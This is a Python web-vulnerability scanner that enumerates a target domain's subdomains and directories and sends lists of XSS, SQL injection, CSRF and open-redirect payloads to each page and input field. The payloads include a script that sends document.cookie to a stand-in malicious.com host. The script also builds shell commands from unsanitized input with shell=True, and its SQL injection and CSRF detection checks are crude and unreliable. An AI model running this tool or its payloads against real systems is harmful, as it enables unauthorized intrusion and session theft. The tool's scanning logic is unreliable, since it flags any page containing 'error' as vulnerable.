"""
Copyright 2024 Enes Sağlam

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
                     """
import subprocess
import requests
from bs4 import BeautifulSoup
import argparse
import logging
from multiprocessing import Pool
from datetime import datetime
from urllib.parse import urlparse

log_file = "scan.log"
logging.basicConfig(filename=log_file, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Global değişkenler
vulnerabilities = {
    'js_vulnerabilities': {},
    'xss_vulnerabilities': {},
    'sql_vulnerabilities': {},
    'csrf_vulnerabilities': {},
    'open_redirects': {}
}


def run_command(command):
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return result.stdout.decode('utf-8')


def notify(message):
    print(message)
    logging.info(message)


def find_subdomains(domain):
    notify(f"[*] Finding subdomains for {domain}...")
    subfinder_cmd = f"subfinder -d {domain} -silent"
    subdomains = run_command(subfinder_cmd).splitlines()
    notify(f"[+] Found {len(subdomains)} subdomains.")
    return subdomains


def check_alive_subdomains(subdomains):
    notify(f"[*] Checking alive subdomains using httpx...")
    httpx_cmd = "httpx -silent"
    process = subprocess.Popen(httpx_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    stdout, _ = process.communicate(input="\n".join(subdomains).encode())
    alive_subdomains = stdout.decode().splitlines()
    notify(f"[+] Found {len(alive_subdomains)} alive subdomains.")
    return alive_subdomains


def find_js_files(subdomain):
    notify(f"[*] Finding .js files in {subdomain}...")
    try:
        response = requests.get(f"http://{subdomain}", timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        scripts = [script.get("src") for script in soup.find_all("script") if
                   script.get("src") and ".js" in script.get("src")]
        return scripts
    except requests.RequestException as e:
        notify(f"[!] Error fetching {subdomain}: {str(e)}")
        return []


def check_js_files(subdomain, js_files):
    for js_file in js_files:
        notify(f"[*] Checking {js_file} with LinkFinder...")
        linkfinder_cmd = f"python3 linkfinder.py -i {js_file} -o cli"
        result = run_command(linkfinder_cmd)
        if "critical vulnerability" in result: 
            if subdomain not in vulnerabilities['js_vulnerabilities']:
                vulnerabilities['js_vulnerabilities'][subdomain] = []
            vulnerabilities['js_vulnerabilities'][subdomain].append(js_file)
        notify(result)


def dirsearch_scan(url):
    notify(f"[*] Running dirsearch on {url}...")
    dirsearch_cmd = f"python3 dirsearch.py -u {url} -e *"
    directories = run_command(dirsearch_cmd)
    notify(directories)
    return directories.splitlines()


def check_xss(subdomain, directories):
    for directory in directories:
        url = f"http://{subdomain}{directory}"
        notify(f"[*] Checking XSS vulnerability in {url}...")

        xss_payloads = [
            "<script>alert('XSS')</script>", 
            "<img src=x onerror=alert('XSS')>", 
            "' OR '1'='1", 
            "<svg/onload=alert('XSS')>", 
            "<iframe src='javascript:alert(1)'></iframe>", 
            "<body onload=alert('XSS')>", 
            "<script>fetch('http://malicious.com?cookie=' + document.cookie)</script>", 
            "<a href='javascript:alert(1)'>Click me</a>", 
            "<input type='text' value='<script>alert(1)</script>'>",  
            "<script>console.log(document.cookie)</script>" 
        ]

        for payload in xss_payloads:
            try:
                response = requests.get(url, params={"q": payload}, timeout=10)
                if payload in response.text:
                    if subdomain not in vulnerabilities['xss_vulnerabilities']:
                        vulnerabilities['xss_vulnerabilities'][subdomain] = []
                    vulnerabilities['xss_vulnerabilities'][subdomain].append(url)
                    notify(f"[!] XSS vulnerability found in {url}")
            except requests.RequestException as e:
                notify(f"[!] Error checking XSS in {url}: {str(e)}")


def check_sql_injection(subdomain, directories):
    for directory in directories:
        url = f"http://{subdomain}{directory}"
        notify(f"[*] Checking SQL injection vulnerability in {url}...")

        sql_payloads = [
            "' OR '1'='1'; --", 
            "' OR '1'='1'/*", 
            "' UNION SELECT NULL, NULL, NULL --", 
            "' AND 1=CONVERT(int, @@version) --",  
            "' AND 1=1 AND EXISTS (SELECT * FROM information_schema.tables) --",
            "' AND 1=1 AND (SELECT COUNT(*) FROM mysql.user) > 0 --", 
            "' AND 1=1 AND (SELECT * FROM pg_catalog.pg_tables) IS NOT NULL --",
            "' AND 1=1 AND (SELECT * FROM sysobjects) IS NOT NULL --",
            "' AND 1=1 AND (SELECT * FROM performance_schema.threads) IS NOT NULL --",

            "' AND 1=1 AND (SELECT @@version) = '10.4.6-MariaDB' --" 
        ]

        for payload in sql_payloads:
            try:
                response = requests.get(url, params={"q": payload}, timeout=10)
                if "SQL syntax" in response.text or "error" in response.text.lower():
                    if subdomain not in vulnerabilities['sql_vulnerabilities']:
                        vulnerabilities['sql_vulnerabilities'][subdomain] = []
                    vulnerabilities['sql_vulnerabilities'][subdomain].append(url)
                    notify(f"[!] SQL injection vulnerability found in {url}")
            except requests.RequestException as e:
                notify(f"[!] Error checking SQL injection in {url}: {str(e)}")

def check_inputs_for_vulnerabilities(subdomain, directories):
    notify(f"[*] Checking SQL and XSS vulnerabilities in input fields of {subdomain}...")

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "<script>fetch('http://malicious.com?cookie=' + document.cookie)</script>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "<input type='text' value='<script>alert(1)</script>'>",
        "<script>console.log(document.cookie)</script>"
    ]

    sql_payloads = [
        "' OR '1'='1'; --",
        "' OR '1'='1'/*",
        "' UNION SELECT NULL, NULL, NULL --",
        "' AND 1=CONVERT(int, @@version) --",
        "' AND 1=1 AND EXISTS (SELECT * FROM information_schema.tables) --",
        "' AND 1=1 AND (SELECT COUNT(*) FROM mysql.user) > 0 --",
        "' AND 1=1 AND (SELECT * FROM pg_catalog.pg_tables) IS NOT NULL --",
        "' AND 1=1 AND (SELECT * FROM sysobjects) IS NOT NULL --",
        "' AND 1=1 AND (SELECT * FROM performance_schema.threads) IS NOT NULL --",
        "' AND 1=1 AND (SELECT @@version) = '10.4.6-MariaDB' --"
    ]

    for directory in directories:
        url = f"http://{subdomain}{directory}"
        notify(f"[*] Checking input fields in {url}...")

        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")
            input_fields = soup.find_all("input")
            for input_field in input_fields:
                input_name = input_field.get("name")
                if input_name:
                    for payload in xss_payloads:
                        xss_response = requests.get(url, params={input_name: payload}, timeout=10)
                        if payload in xss_response.text:
                            if subdomain not in vulnerabilities['xss_vulnerabilities']:
                                vulnerabilities['xss_vulnerabilities'][subdomain] = []
                            vulnerabilities['xss_vulnerabilities'][subdomain].append(url)
                            notify(f"[!] XSS vulnerability found in {url} on input {input_name}")

                    for payload in sql_payloads:
                        sql_response = requests.get(url, params={input_name: payload}, timeout=10)
                        if "SQL syntax" in sql_response.text or "error" in sql_response.text.lower():
                            if subdomain not in vulnerabilities['sql_vulnerabilities']:
                                vulnerabilities['sql_vulnerabilities'][subdomain] = []
                            vulnerabilities['sql_vulnerabilities'][subdomain].append(url)
                            notify(f"[!] SQL injection vulnerability found in {url} on input {input_name}")

        except requests.RequestException as e:
            notify(f"[!] Error checking input fields in {url}: {str(e)}")


def check_csrf(subdomain, directories):
    for directory in directories:
        url = f"http://{subdomain}{directory}"
        notify(f"[*] Checking CSRF vulnerability in {url}...")
        csrf_payload = "<img src='http://malicious.com/csrf?url=" + url + "'>"
        try:
            response = requests.get(url, params={"q": csrf_payload}, timeout=10)
            if "CSRF vulnerability detected" in response.text:
                if subdomain not in vulnerabilities['csrf_vulnerabilities']:
                    vulnerabilities['csrf_vulnerabilities'][subdomain] = []
                vulnerabilities['csrf_vulnerabilities'][subdomain].append(url)
                notify(f"[!] CSRF vulnerability found in {url}")
        except requests.RequestException as e:
            notify(f"[!] Error checking CSRF in {url}: {str(e)}")


def check_open_redirects(subdomain, directories):
    for directory in directories:
        url = f"http://{subdomain}{directory}"
        notify(f"[*] Checking open redirects in {url}...")
        redirect_payloads = ["http://malicious.com", "https://evil.com"]
        for payload in redirect_payloads:
            try:
                response = requests.get(url, params={"redirect": payload}, timeout=10)
                if urlparse(response.url).netloc in [urlparse(payload).netloc]:
                    if subdomain not in vulnerabilities['open_redirects']:
                        vulnerabilities['open_redirects'][subdomain] = []
                    vulnerabilities['open_redirects'][subdomain].append(url)
                    notify(f"[!] Open redirect vulnerability found in {url}")
            except requests.RequestException as e:
                notify(f"[!] Error checking open redirects in {url}: {str(e)}")


def process_subdomain(subdomain):
    js_files = find_js_files(subdomain)
    if js_files:
        check_js_files(subdomain, js_files)
    directories = dirsearch_scan(f"http://{subdomain}")
    check_xss(subdomain, directories)
    check_sql_injection(subdomain, directories)
    check_csrf(subdomain, directories)
    check_open_redirects(subdomain, directories)
    check_inputs_for_vulnerabilities(subdomain, directories)


def main(domain, threads):

    notify(f"[*] Starting security checks on main domain {domain}...")
    main_directory = dirsearch_scan(f"http://{domain}")
    check_xss(domain, main_directory)
    check_sql_injection(domain, main_directory)
    check_csrf(domain, main_directory)
    check_open_redirects(domain, main_directory)


    subdomains = find_subdomains(domain)
    alive_subdomains = check_alive_subdomains(subdomains)

    notify("[*] Starting parallel processing for subdomains...")
    with Pool(processes=threads) as pool:
        pool.map(process_subdomain, alive_subdomains)

    notify("[+] Scan completed. Check the log file for details.")
    generate_report()


def generate_report():
    notify("\n[+] Scan Report:")

    if vulnerabilities['js_vulnerabilities']:
        notify("\n[+] Critical JavaScript Vulnerabilities:")
        for subdomain, files in vulnerabilities['js_vulnerabilities'].items():
            notify(f"[*] Subdomain: {subdomain}")
            for file in files:
                notify(f"    [+] Vulnerable JS File: {file}")
    else:
        notify("[*] No critical JavaScript vulnerabilities found.")

    if vulnerabilities['xss_vulnerabilities']:
        notify("\n[+] XSS Vulnerabilities:")
        for subdomain, urls in vulnerabilities['xss_vulnerabilities'].items():
            notify(f"[*] Subdomain: {subdomain}")
            for url in urls:
                notify(f"    [+] Vulnerable URL: {url}")
    else:
        notify("[*] No XSS vulnerabilities found.")

    if vulnerabilities['sql_vulnerabilities']:
        notify("\n[+] SQL Injection Vulnerabilities:")
        for subdomain, urls in vulnerabilities['sql_vulnerabilities'].items():
            notify(f"[*] Subdomain: {subdomain}")
            for url in urls:
                notify(f"    [+] Vulnerable URL: {url}")
    else:
        notify("[*] No SQL injection vulnerabilities found.")

    if vulnerabilities['csrf_vulnerabilities']:
        notify("\n[+] CSRF Vulnerabilities:")
        for subdomain, urls in vulnerabilities['csrf_vulnerabilities'].items():
            notify(f"[*] Subdomain: {subdomain}")
            for url in urls:
                notify(f"    [+] Vulnerable URL: {url}")
    else:
        notify("[*] No CSRF vulnerabilities found.")

    if vulnerabilities['open_redirects']:
        notify("\n[+] Open Redirects:")
        for subdomain, urls in vulnerabilities['open_redirects'].items():
            notify(f"[*] Subdomain: {subdomain}")
            for url in urls:
                notify(f"    [+] Vulnerable URL: {url}")
    else:
        notify("[*] No open redirect vulnerabilities found.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced automated security testing script.")
    parser.add_argument("domain", help="The domain to scan")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of parallel threads (default: 4)")
    args = parser.parse_args()

    start_time = datetime.now()
    notify(f"Starting scan for {args.domain} at {start_time}")
    main(args.domain, args.threads)
    end_time = datetime.now()
    notify(f"Scan completed in {end_time - start_time}.")
